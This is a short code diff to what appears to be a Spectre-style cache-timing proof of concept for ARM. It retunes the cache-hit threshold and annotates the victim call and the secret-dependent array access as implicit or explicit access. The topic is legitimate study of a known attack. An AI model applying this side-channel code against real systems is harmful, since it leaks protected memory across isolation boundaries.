@@ -21,7 +21,7 @@ Victim code.
 #define stride 256
 int DELTA = 64;
 int TOP_N = 10;
-int CACHE_HIT_THRESHOLD = 130;
+int CACHE_HIT_THRESHOLD = 94;
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
@@ -167,9 +167,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int coun
             asm volatile("dsb ish"); // Data synchronization barrier ensure write has completed
             asm volatile("isb"); // Insert isb for serialization after cache flush
         }
-        victim_function(malicious_x);
-        printf("\nsecrete %d\n",*(secret + count));
-        temp &= array2[*(secret + count) * stride + DELTA];
+        victim_function(malicious_x); //implict access
+        printf("\nsecrete %d\n",*(secret + count)); //explict access
+        temp &= array2[*(secret + count) * stride + DELTA]; //explict access
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++)
